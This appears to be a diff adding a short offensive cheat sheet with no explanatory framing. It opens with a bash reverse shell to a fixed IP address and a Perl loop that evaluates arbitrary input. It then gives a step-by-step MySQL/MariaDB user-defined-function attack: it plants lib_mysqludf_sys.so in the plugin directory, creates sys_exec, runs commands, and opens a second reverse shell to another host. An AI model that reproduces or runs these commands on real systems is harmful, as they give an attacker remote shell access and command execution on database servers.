@@ -1,0 +1,29 @@
+/bin/sh -i >& /dev/tcp/200.200.100.10/1234 0>&1
+
+do{
+   print("perl__ ");
+   $_x=<>;
+   chomp $_x;
+   print(eval($_x)."\n")
+
+}while($_x ne "q");
+
+while(true){ $_x }
+
+# Use a database
+use mysql;
+# Create a table to load the library and move it to the plugins dir
+create table npn(line blob);
+# Load the binary library inside the table
+## You might need to change the path and file name
+insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
+# Get the plugin_dir path
+show variables like '%plugin%';
+# Supposing the plugin dir was /usr/lib/x86_64-linux-gnu/mariadb19/plugin/
+# dump in there the library
+select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so';
+# Create a function to execute commands
+create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
+# Execute commands
+select sys_exec('id > /tmp/out.txt; chmod 777 /tmp/out.txt');
+select sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.66/1234 0>&1"');
